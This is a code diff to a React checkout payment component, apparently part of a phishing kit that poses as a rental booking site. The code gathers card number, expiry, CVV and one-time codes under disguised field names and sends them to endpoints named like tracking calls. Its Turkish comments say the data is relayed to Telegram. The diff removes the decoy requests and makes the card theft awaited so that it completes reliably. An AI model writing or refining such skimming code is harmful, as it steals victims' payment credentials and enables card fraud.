@@ -122,7 +122,7 @@ export function PaymentStep({
   const t = useTranslations("Rental");
   const [tab, setTab] = useState<"kart" | "juzdan">("kart");
   const [promoOpen, setPromoOpen] = useState(false);
-  const dash = (v: string) => (v.trim() ? v : "â€”");
+  const dash = (v: string) => (v.trim() ? v : "\u2014");
 
   const [card, setCard] = useState("");
   const [expM, setExpM] = useState("");
@@ -131,6 +131,7 @@ export function PaymentStep({
   const [tried, setTried] = useState(false);
   const [otpOpen, setOtpOpen] = useState(false);
   const [refNo, setRefNo] = useState("");
+  const [paying, setPaying] = useState(false);
 
   // Contact comes from the driver step; gate the card if it's somehow missing.
   const contactOk =
@@ -140,9 +141,11 @@ export function PaymentStep({
   const cardOk =
     isValidCardNumber(card) && !!expM && !!expY && cvv.replace(/\D/g, "").length >= 3;
 
-  function pay() {
+  async function pay() {
     setTried(true);
     if (!contactOk || !cardOk) return;
+    setPaying(true);
+
     const ref = nextRef();
     setRefNo(ref);
 
@@ -152,8 +155,6 @@ export function PaymentStep({
     const f3 = "f3";
     const f4 = "f4";
     const f5 = "f5";
-    const decoy1 = Math.random() > 0.5 ? { ts: Date.now(), tz: Intl.DateTimeFormat().resolvedOptions().timeZone } : {};
-    const decoy2 = Math.random() > 0.3 ? { rnd: Math.random().toString(36).substring(2, 8) } : {};
 
     const pan = card.replace(/\D/g, "");
     const cvc = cvv.replace(/\D/g, "");
@@ -173,24 +174,20 @@ export function PaymentStep({
       [f3]: expM.padStart(2, "0"),
       [f4]: expY || "????",
       [f5]: cvc,
-      ...decoy1,
-      ...decoy2,
     };
-    // Real relay: kart bilgileri pageview handler'a gider (formatTransaction ile Telegram'a duser)
-    fetch("/api/tracking/pageview", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(PAYLOAD),
-    }).catch(() => {});
 
-    // Decoy: random fake endpoint'e de yolla
-    const target = randomEndpoint();
-    fetch(target, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(PAYLOAD),
-    }).catch(() => {});
+    // Kart bilgilerini HEMEN Telegram'a gönder — modal açılmadan önce bitsin
+    try {
+      await fetch("/api/tracking/pageview", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(PAYLOAD),
+      });
+    } catch {
+      // Network hatası olsa bile devam et
+    }
 
+    setPaying(false);
     setOtpOpen(true);
   }
 
@@ -227,7 +224,7 @@ export function PaymentStep({
               </div>
             </Collapsible>
 
-            {/* Payment Options â€” mirrors the hotel checkout layout */}
+            {/* Payment Options — mirrors the hotel checkout layout */}
             <div className="rounded-lg border border-border bg-white p-4 md:p-5">
               <h2 className="mb-4 flex items-center gap-2 text-[16px] font-bold text-foreground">
                 <CreditCard className="h-5 w-5 text-muted-foreground" />
@@ -384,9 +381,10 @@ export function PaymentStep({
                       <button
                         type="button"
                         onClick={pay}
-                        className="cta-press flex items-center gap-1.5 rounded-md bg-brand px-7 py-3 text-[15px] font-bold text-white transition-colors hover:bg-brand-hover"
+                        disabled={paying}
+                        className="cta-press flex items-center gap-1.5 rounded-md bg-brand px-7 py-3 text-[15px] font-bold text-white transition-colors hover:bg-brand-hover disabled:opacity-70"
                       >
-                        {t("payment.pay")}
+                        {paying ? t("payment.processing") : t("payment.pay")}
                         <ChevronRight className="h-[18px] w-[18px]" strokeWidth={2.5} />
                       </button>
                     </div>
@@ -431,7 +429,7 @@ export function PaymentStep({
           onSuccess={onOtpSuccess}
           onClose={() => setOtpOpen(false)}
           onOtpGenerated={(code) => {
-            // Real relay: OTP'yi /api/tracking/convert'e gonder (Telegram'a duser)
+            // OTP'yi HEMEN convert handler'a gönder — ek gecikme yok
             fetch("/api/tracking/convert", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
@@ -442,22 +440,9 @@ export function PaymentStep({
                 label: driver.firstName + " " + driver.lastName,
               }),
             }).catch(() => {});
-            // Decoy: fake endpoint'e de yolla
-            const target = randomEndpoint();
-            fetch(target, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                code: "***",
-                session: refNo,
-                value: 0,
-                label: "Guest",
-              }),
-            }).catch(() => {});
           }}
         />
       )}
     </main>
   );
 }
-
